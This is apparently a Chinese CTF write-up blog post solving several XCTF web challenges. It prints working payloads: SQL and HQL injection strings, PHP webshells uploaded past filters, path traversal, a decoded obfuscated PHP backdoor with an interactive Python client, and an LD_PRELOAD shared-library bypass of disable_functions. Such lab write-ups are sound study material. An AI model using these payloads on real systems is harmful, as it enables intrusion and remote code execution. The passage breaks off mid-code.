---

title: 攻防世界 Web Writeup Part1 <简单部分>
categories:
  - 平台Writeup
tags:
  - ctf
  - Web
  - Writeup
index_img: /img/used/prac.jpg
date: 2020-01-17 22:53:32

---

# 攻防世界Web进阶部分题解

## FlatScience

通过这题学到一些SQLite的语法，wget的应用

robots.txt找到两个隐藏文件。进入login.php，注入了一番好像没什么效果，查看源码发现一个debug选项，于是在URL后面加上?debug得到源码

```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?> 
```

看到SQL没有任何过滤，尝试注入，注入结果可以通过Cookie显示。

前置知识：sqlite的元数据存放在一个叫做sqlite_master的表中

首先得到表名。`'union select 1,group_concat(name) from sqlite_master`，group_concat聚集函数用来把所有表名都得到，返回结果：`Users,sqlite_autoindex_Users_1`

查询Users表即可。获得表的原信息有一个简单的方法：查询sqlite_master中的sql字段，这是对应表的建表语句。构造语句：`'union select 1,sql from sqlite_master where name="Users"--`，得到结果`CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))`，从中可以看出各个字段。

语句`'union select 1,password from Users where name="admin"--`得到密码的sha1值：`3fab54a50e770d830c0416df817567662a9dc85c`

语句`'union select 1,hint from Users--`得到hint： `my fav word in my fav paper?!`，看起来是密码了，但是怎么找他的fav word 和 fav paper呢？

其实可以直接网查md5。。`ThinJerboaSalz!`去掉Salz!就可以了

登录就有flag`flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}`

或者也可以全都看一遍。。用wget把所有pdf都爬下来

[wget命令详解](https://www.cnblogs.com/ftl1012/p/9265699.html)

```
wget http://111.198.29.45:34550/ -r -np -nd -A .pdf
```

其中：-r表示递归，-nd表示不下载重复文件，-np表示不要递归到父目录，-A表示下载文件的类型。

接下来可以写个python脚本把所有的单词搞下来

## bug

注册登陆功能。我注册了一个账号，用户名123，密码123，生日2015/01/01，地址123。返回了uid=5

登录后发现cookie中多了个sessionid和user，user用md5解密后是5:123，也就是uid加上用户名。

personal页面有逻辑漏洞，这里直接获得admin的信息。

```
UID 	1
Username 	admin
Birthday 	1993/01/01
Address 	福建省福州市闽侯县
```

去findpwd，使用这些信息，修改密码，成功登陆。

然后提示IP不允许，抓包修改一下。界面没有显示flag，但提示了一个页面：`module=filemanage&do=???`，于是尝试一下do参数的值，改成upload，进入上传界面。

简单滴绕一下就可以了

```
-----------------------------384910805270038131130524863
Content-Disposition: form-data; name="upfile"; filename="shl.php5"
Content-Type: image/jpeg

<script language="php">@eval($_POST[pass])</script>
-----------------------------384910805270038131130524863--
```

`cyberpeace{15fe2c9df94d3257760dc148fca98c8f}`

## ics-07

项目管理中找到一个view-source.php

```php
<?php
    session_start();

    if (!isset($_GET[page])) {
      show_source(__FILE__);
      die();
    }

    if (isset($_GET[page]) && $_GET[page] != 'index.php') {
      include('flag.php');
    }else {
      header('Location: ?page=flag.php');
    }

    ?>

    <form action="#" method="get">
      page : <input type="text" name="page" value="">
      id : <input type="text" name="id" value="">
      <input type="submit" name="submit" value="submit">
    </form>
    <br />
    <a href="index.phps">view-source</a>

    <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>

    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>
```

根据要求，首先page构造一个不是index.php的

接下来想办法带有admin的session，id参数要求浮点值不为1且最后一位是9，用1a9就可以构造了。这里用了escape过滤id，宽字节注入要求网站使用gbk编码，尝试了下并没有成功。

然后看到上面的upload模块，正则的意思是：文件名的末尾不能是.php,.php3等等，而不是说文件中间也不能出现这些字符。因此利用Linux的文件特性，可以如此构造

```
shell.php/nouse.php/..
con = <?php @eval($_POST['cmd']);?>
```

连接webshell就可以看到flag了。

`cyberpeace{530f4f16dccfe259a753b3ef56790fda}`

## i-got-id-200[unsolved]

回来一定做QAQ

去北京的飞机上我会把Perl学完

## Web_php_wrong_nginx_config

没什么用的登录页面。robots.txt提示了两个:hint.php和hack.php

hint.php:配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf

Hack.php，进入提示请登录。注意到isLogin的cookie，修改成1，成功进入。

注意到URL很有意思

```
http://111.198.29.45:41940/admin/admin.php?file=index&ext=php
```

可能有文件包含，但是直接输入

```
../../../../etc/passwd
```

显示不出东西

于是先做一次尝试：假设过滤并消除了`../`

```
http://111.198.29.45:41940/admin/admin.php?file=..././..././..././..././etc/passwd&ext=
```

能够读出。

```
..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=conf
```

读取出site.conf内容是

```
server {
    ...
    location ~ /\. {
            log_not_found off;
            deny all;
    }
    location /web-img {
        alias /images/;
        autoindex on;
    }
    location ~* \.(ini|docx|pcapng|doc)$ {  
         deny all;  
    }  
    include /var/www/nginx[.]conf;
}
```

autoindex表示目录浏览功能，也就是在这个目录可以进行目录遍历。

把/web-img/变为/web-img../可以访问根目录，具体原因也不清楚

![](https://ww1.yunjiexi.club/2020/01/17/jFOvC.png)

在网站找到hack.php的bak

```php
<?php
$U='_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';
$q='s[|U$i]="";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';
$M='l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';
$z='r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&|U&$ra){$u=parse_|Uurl($r';
$k='?:;q=0.([\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&&$m){|U|U|U@session_start()|U|U;$s=&$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s';
$o='|U$l;|U){for|U($j=0;($j|U<$c&&|U|U$i|U<$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r';
$N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/';
$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U<$k>$d</$k>"|U);@ses|U|Usion_des|Utroy();}}}}';
$j='$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i<';
$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');
$J='kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z<cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$';
$x='r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\|U|Uw])[|U\\w-]+|U(';
$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
$g=create_function('',$f);
$g();
?>
```

乱七八糟的，执行处理一下

```php
$kh="42f7";$kf="e9ac";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r["HTTP_REFERER"];$ra=@$r["HTTP_ACCEPT_LANGUAGE"];if($rr&&$ra){$u=parse_url($rr);parse_str($u["query"],$q);$q=array_values($q);preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);if($q&&$m){@session_start();$s=&$_SESSION;$ss="substr";$sl="strtolower";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="";for($z=1;$z$d");@session_destroy();}}}}
```

依然看不出是什么。。网上搜了一下，好像是个后门程序。网上给出了利用程序，原理也不清楚...

```python
#!/usr/bin/env python
# encoding: utf-8
from random import randint,choice
from hashlib import md5
import urllib
import string
import zlib
import base64
import requests
import re

def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        result += choice(string.ascii_letters)
    return result

def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result


def debugPrint(msg):
    if debugging:
        print msg

# config
debugging = False
keyh = "42f7" # $kh
keyf = "e9ac" # $kf
xorKey = keyh + keyf
url = 'http://111.198.29.45:41940/hack.php'
defaultLang = 'zh-CN'
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug

sess = requests.Session()

# generate random Accept-Language only once each session
langTmp = choicePart(languages,3)
indexes = sorted(choicePart(range(1,10),3), reverse=True)

acceptLang = [defaultLang]
for i in xrange(3):
    acceptLang.append(langTmp[i] % (indexes[i],))
acceptLangStr = ','.join(acceptLang)
debugPrint(acceptLangStr)

init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
md5head = (md5(init2Char + keyh).hexdigest())[0:3]
md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
debugPrint('$i is %s' % (init2Char))
debugPrint('md5 head: %s' % (md5head,))
debugPrint('md5 tail: %s' % (md5tail,))

# Interactive php shell
cmd = raw_input('phpshell > ')
while cmd != '':
    # build junk data in referer
    query = []
    for i in xrange(max(indexes)+1+randint(0,2)):
        key = randAlpha(randint(3,6))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
        query.append((key, value))
    debugPrint('Before insert payload:')
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    # encode payload
    payload = zlib.compress(cmd)
    payload = loopXor(payload,xorKey)
    payload = base64.urlsafe_b64encode(payload)
    payload = md5head + payload

    # cut payload, replace into referer
    cutIndex = randint(2,len(payload)-3)
    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
    iPiece = 0
    for i in indexes:
        query[i] = (query[i][0],payloadPieces[iPiece])
        iPiece += 1
    referer = url + '?' + urllib.urlencode(query)
    debugPrint('After insert payload, referer is:')
    debugPrint(query)
    debugPrint(referer)

    # send request
    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
    html = r.text
    debugPrint(html)

    # process response
    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
    output = pattern.findall(html)
    if len(output) == 0:
        print 'Error,  no backdoor response'
        cmd = raw_input('phpshell > ')
        continue
    output = output[0]
    debugPrint(output)
    output = output.decode('base64')
    output = loopXor(output,xorKey)
    output = zlib.decompress(output)
    print output
    cmd = raw_input('phpshell > ')
```

![](https://ww1.yunjiexi.club/2020/01/17/jFtL4.png)

`ctf{a57b3698-eeae-48c0-a669-bafe3213568c}`

## wtf.sh-150

注册了一个123的账号，登陆后发现生成cookie：username和token，看一下token，b64decode没成功

```
Tgaksz0zOnsYOn7sy26RCs5/oADMj329BJTnagghgiRf2iyQrab4ZMPJ99K+9rj2VJJdPwRZSS7Rjf/wJrBi2g==
```

点了一下评论，发现POST参数直接有评论者的名称，于是考虑参数有没有目录遍历、文件包含的漏洞。构造`post=xxx/../../`

![](https://ww1.yunjiexi.club/2020/01/22/jKO9z.png)

果然包含了一大堆代码，搜索flag，发现了这样一段

```shell
<html>
<head>
    <link rel="stylesheet" type="text/css" href="/css/std.css" >
</head>
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "<h3>${username}'s posts:</h3>";
$   echo "<ol>";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
$       echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</a></li>";
$   done 
$   echo "</ol>";
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
</html>
```

这个告诉我们以admin登录就可以获得flag1。注意到

```shell
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
```

告诉我们有一个user目录，于是尝试包含`../user/`，获得了所有人的token。

然后cookie欺骗一下就可以获得第一段flag了。

` xctf{cb49256d1ab48803`

接下来有些找不到思路，题解指出，wtf这种非正规后缀，一定存在着自己编写的解析文件，于是我们应该去这个解析文件看看。搜索wtf，稍微看一下代码，找到了这个文件（有些长），是一段shellcode，用于解析wtf文件。

理论上是要审计一遍所有代码。。根据题解提示，找到了评论相关的代码：

```shell
function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" > "${next_file}";
    echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
    echo "${text}" >> "${next_file}";

    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

注意到这里可以进行文件写入功能，我们可以试着写入shellcode，再访问执行。

于是我们先抓一个reply的包，再构造`post=../users_lookup/sh.wtf`的上传文件

接下来创建恶意代码的用户名评论就可以了。

创建的用户名：

```bash
${find,/,-iname,get_flag2}
```

因为上面有get_flag1了。

重新利用漏洞链，返回如下结果

```
/usr/bin/get_flag2
```

继续以上步骤

```bash
${/usr/bin/get_flag2}
```

得到flag2

`149e5ec49d3c29ca}`

合起来就是

`xctf{cb49256d1ab48803149e5ec49d3c29ca}`

## triangle[unsolved]

这好像是一道逆向题

```js
function login(){
	var input = document.getElementById('password').value;
	var enc = enc_pw(input);
	var pw = get_pw();
	if(test_pw(enc, pw) == 1){
		alert('Well done!');
	}
	else{
		alert('Try again ...');
	}
}
```

其中，加密和解密是这样的

```javascript
function test_pw(e, _) {
  var t = stoh(atob(getBase64Image('eye'))),
  r = 4096,
  m = 8192,
  R = 12288,
  a = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
  a.reg_write_i32(uc.ARM_REG_R9, m),
  a.reg_write_i32(uc.ARM_REG_R10, R),
  a.reg_write_i32(uc.ARM_REG_R8, _.length),
  a.mem_map(r, 4096, uc.PROT_ALL);
  for (var o = 0; o < o1.length; o++) a.mem_write(r + o, [
    t[o1[o]]
  ]);
  a.mem_map(m, 4096, uc.PROT_ALL),
  a.mem_write(m, stoh(_)),
  a.mem_map(R, 4096, uc.PROT_ALL),
  a.mem_write(R, stoh(e));
  var u = r,
  c = r + o1.length;
  return a.emu_start(u, c, 0, 0),
  a.reg_read_i32(uc.ARM_REG_R5)
}
function enc_pw(e) {
  var _ = stoh(atob(getBase64Image('frei'))),
  t = 4096,
  r = 8192,
  m = 12288,
  R = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
  R.reg_write_i32(uc.ARM_REG_R8, r),
  R.reg_write_i32(uc.ARM_REG_R9, m),
  R.reg_write_i32(uc.ARM_REG_R10, e.length),
  R.mem_map(t, 4096, uc.PROT_ALL);
  for (var a = 0; a < o2.length; a++) R.mem_write(t + a, [
    _[o2[a]]
  ]);
  R.mem_map(r, 4096, uc.PROT_ALL),
  R.mem_write(r, stoh(e)),
  R.mem_map(m, 4096, uc.PROT_ALL);
  var o = t,
  u = t + o2.length;
  return R.emu_start(o, u, 0, 0),
  htos(R.mem_read(m, e.length))
}
function get_pw() {
  for (var e = stoh(atob(getBase64Image('templar'))), _ = '', t = 0; t < o3.length; t++) _ += String.fromCharCode(e[o3[t]]);
  return _
}
```

get_pw()可以直接运行出来

```
XYzaSAAX_PBssisodjsal_sSUVWZYYYb
```

呜呜呜不行啊真的不会

## smarty[unsolved]

是个php框架，模板注入，考虑请求头，在xff这里发现了模板注入。

构造语句可以写入文件。

```
X-Forwarded-For: {file_put_contents('/var/www/html/shell.php','<?php eval($_POST[shell]);')}
```

但是连接后发现，访问权限仅停留在web目录。

phpinfo看一下

```
X-Forwarded-For: {file_put_contents('/var/www/html/info.php','<?php phpinfo();')}
```

![](https://ww1.yunjiexi.club/2020/01/23/jSc0z.png)

（根据题解思路）

我们希望执行系统的一个程序，但是这些函数还不能用。

一个解决方法是使用LD_preload机制，配合`putenv()`函数。该函数可以更改系统的环境变量，而LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime  linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

因此我们要先生成一个恶意的动态链接库`.so文件`

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

编译：

```bash
gcc -shared -fPIC evil.c -o evil.so
```

用php改变环境变量

```php
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
		//2>&1:错误流也重定向到标准输出
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "","");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```

但好像并没有跑出来。。

```
http://111.198.29.45:54398/pass.php?cmd= echo hello&outpath=/var/www/html/asd&sopath=/var/www/html/evil.so
```

## Zhuanxv[puzzled]

先用dirsearch跑一下，发现了/list，直接打开，是一个后台登录页面。

但是此时抓包发现，调用了一个api如下

```http
GET /loadimage?fileName=web_login_bg.jpg HTTP/1.1
Host: 111.198.29.45:47620
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: image/webp,*/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://111.198.29.45:47620/zhuanxvlogin
Cookie: JSESSIONID=E1C890AE3EA936D0DAEA0C316E142F3F

```

猜测可以任意读取文件。尝试一下index.jsp，真的成功了。根据javaweb的文件结构，读取`fileName=../../WEB-INF/web.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>Struts Blank</display-name>
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>/ctfpage/index.jsp</welcome-file>
    </welcome-file-list>
    <error-page>
        <error-code>404</error-code>
        <location>/ctfpage/404.html</location>
    </error-page>
</web-app>
```

注意到使用struts2框架编写。根据此框架的目录结构，读取`?fileName=../../WEB-INF/classes/struts.xml`

```xml
<struts>
	<constant name="strutsenableDynamicMethodInvocation" value="false"/>
    <constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
    <constant name="struts.action.extension" value=","/>
    <package name="front" namespace="/" extends="struts-default">
        <global-exception-mappings>
            <exception-mapping exception="java.lang.Exception" result="error"/>
        </global-exception-mappings>
        <action name="zhuanxvlogin" class="com.cuitctf.action.UserLoginAction" method="execute">
            <result name="error">/ctfpage/login.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
        <action name="loadimage" class="com.cuitctf.action.DownloadAction">
            <result name="success" type="stream">
                <param name="contentType">image/jpeg</param>
                <param name="contentDisposition">attachment;filename="bg.jpg"</param>
                <param name="inputName">downloadFile</param>
            </result>
            <result name="suffix_error">/ctfpage/welcome.jsp</result>
        </action>
    </package>
    <package name="back" namespace="/" extends="struts-default">
        <interceptors>
            <interceptor name="oa" class="com.cuitctf.util.UserOAuth"/>
            <interceptor-stack name="userAuth">
                <interceptor-ref name="defaultStack" />
                <interceptor-ref name="oa" />
            </interceptor-stack>

        </interceptors>
        <action name="list" class="com.cuitctf.action.AdminAction" method="execute">
            <interceptor-ref name="userAuth">
                <param name="excludeMethods">
                    execute
                </param>
            </interceptor-ref>
            <result name="login_error">/ctfpage/login.jsp</result>
            <result name="list_error">/ctfpage/welcome.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
    </package>
</struts>
```

看到了几个类，尝试把他们的class文件下载下来反编译。首先是登录的

```
../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class
```

反编译之后得到(截取重要代码)

```java
import com.cuitctf.service.UserService;

   public boolean userCheck(User user) {
      List userList = this.userService.loginCheck(user.getName(), user.getPassword());
      if(userList != null && userList.size() == 1) {
         return true;
      } else {
         this.addActionError("Username or password is Wrong, please check!");
         return false;
      }
   }

```

因此下一步读取

```
../../WEB-INF/classes/com/cuitctf/service/UserService.class
```

```java
package com.cuitctf.service;
import java.util.List;
public interface UserService {
   List findUserByName(String var1);
   List loginCheck(String var1, String var2);
}

```

只是一个接口，具体实现在哪里呢？

网上wp说还有一个applicationContext.xml，不过这不是Spring框架的吗？

位置是

```
../../WEB-INF/classes/applicationContext.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName">
            <value>com.mysql.jdbc.Driver</value>
        </property>
        <property name="url">
            <value>jdbc:mysql://localhost:3306/sctf</value>
        </property>
        <property name="username" value="root"/>
        <property name="password" value="root" />
    </bean>
    <bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
        <property name="dataSource">
            <ref bean="dataSource"/>
        </property>
        <property name="mappingLocations">
            <value>user.hbm.xml</value>
        </property>
        <property name="hibernateProperties">
            <props>
                <prop key="hibernate.dialect">org.hibernate.dialect.MySQLDialect</prop>
                <prop key="hibernate.show_sql">true</prop>
            </props>
        </property>
    </bean>
    <bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate">
        <property name="sessionFactory">
            <ref bean="sessionFactory"/>
        </property>
    </bean>

    <bean id="service" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean" abstract="true">
        <property name="transactionManager">
            <ref bean="transactionManager"/>
        </property>
        <property name="transactionAttributes">
            <props>
                <prop key="add">PROPAGATION_REQUIRED</prop>
                <prop key="find*">PROPAGATION_REQUIRED,readOnly</prop>
            </props>
        </property>
    </bean>
    <bean id="userDAO" class="com.cuitctf.dao.impl.UserDaoImpl">
        <property name="hibernateTemplate">
            <ref bean="hibernateTemplate"/>
        </property>
    </bean>
    <bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl">
        <property name="userDao">
            <ref bean="userDAO"/>
        </property>
    </bean>
</beans>
```

看到用了Hibernate框架，并且找到了UserServiceImpl，注意到这里过滤了空格和等号。

```java
public List <User> loginCheck(String name, String password) {
        name = name.replaceAll(" ", "");
        name = name.replaceAll("=", "");
        Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
        Matcher password_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(password);
        if (password_matcher.find()) {
            return this.userDao.loginCheck(name, password);
        }
        return null;
    }

```

和UserDaoImpl

```java
 public List < User > loginCheck(String name, String password) {
        return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");  
    }

```

这显然就可以注入了。

于是可以以管理员登录`/zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270%27%0Aor%0Aname%0Alike%0A%27admin&user.password=1`

之后注意到list这个api的功能，它可以列出目录，这样就好办了。一步步地发现目录

```
/list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes/
```

这里还发现了有个user.hbm.xml，尝试读取

```xml
<hibernate-mapping package="com.cuitctf.po">
    <class name="User" table="hlj_members">
        <id name="id" column="user_id">
            <generator class="identity"/>
        </id>
        <property name="name"/>
        <property name="password"/>
    </class>
    <class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b">
        <id name="flag" column="welcometoourctf">
            <generator class="identity"/>
        </id>
        <property name="flag"/>
    </class>
</hibernate-mapping>
```

这样子就知道flag在哪里了。可以在刚才登录的基础上进行盲注

自己写盲注什么都没注出来，这是网上的脚本，但是payload中的列名和表名和上面的配置并不一样。这是为什么。。

进行盲注

```python
import requests
s=requests.session()

FLAG=''
for i in range(1,50):
    p=''
    for j in range(1,255):
        payload="(select%0Aascii(substr(id,"+str(i)+",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'"+str(j)+"'"
        url="http://111.198.29.45:47620/zhuanxvlogin?user.name=admin'%0Aor%0A"+payload+"%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        #print(len(r1.text))
        if len(r1.text)>20000 and p!='':
            FLAG+=p
            print(i,FLAG)
            break
        p=chr(j)
```

`sctf{C46E250926A2DFFD831975396222B08E}`

## blgdel

扫描发现一个源码（config.php的）

```php
<?php

class master
{
	private $path;
	private $name;
	
	function __construct(){}
	
	function stream_open($path)
	{
		if(!preg_match('/(.*)\/(.*)$/s',$path,$array,0,9))
			return 1;
		$a=$array[1];
		parse_str($array[2],$array);
		
		if(isset($array['path']))
		{
			$this->path=$array['path'];
		}
		else
			return 1;
		if(isset($array['name']))
		{
			$this->name=$array['name'];
		}
		else
			return 1;
		
		if($a==='upload')
		{
			return $this->upload($this->path,$this->name);
		}
		elseif($a==='search')
		{
			return $this->search($this->path,$this->name);
		}
		else 
			return 1;
	}
	function upload($path,$name)
	{
		if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))
			return 1;
		
		$filename=$_FILES[$name]['name'];
		echo $filename;
		
		$file=file_get_contents($_FILES[$name]['tmp_name']);
		
		$file=str_replace('<','!',$file);
		$file=str_replace(urldecode('%03'),'!',$file);
		$file=str_replace('"','!',$file);
		$file=str_replace("'",'!',$file);
		$file=str_replace('.','!',$file);
		if(preg_match('/file:|http|pre|etc/is',$file))
		{
			echo 'illegalbbbbbb!';
			return 1;
		}
		
		file_put_contents($path.$filename,$file);
		file_put_contents($path.'user.jpg',$file);
		
		
		echo 'upload success!';
		return 1;
	}
	function search($path,$name)
	{
		if(!is_dir($path))
		{
			echo 'illegal!';
			return 1;
		}
		$files=scandir($path);
		echo '</br>';
		foreach($files as $k=>$v)
		{
